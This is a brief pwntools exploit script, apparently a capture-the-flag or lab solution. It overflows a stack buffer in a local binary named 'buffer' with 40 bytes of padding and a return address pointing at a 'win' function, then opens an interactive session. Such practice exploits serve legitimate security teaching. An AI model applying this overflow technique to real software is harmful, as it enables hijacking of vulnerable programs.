from pwn import *

elf = context.binary = ELF("./buffer")
io = process()

io.sendline(b'a'*40 + p64(elf.sym.win+1))
io.interactive()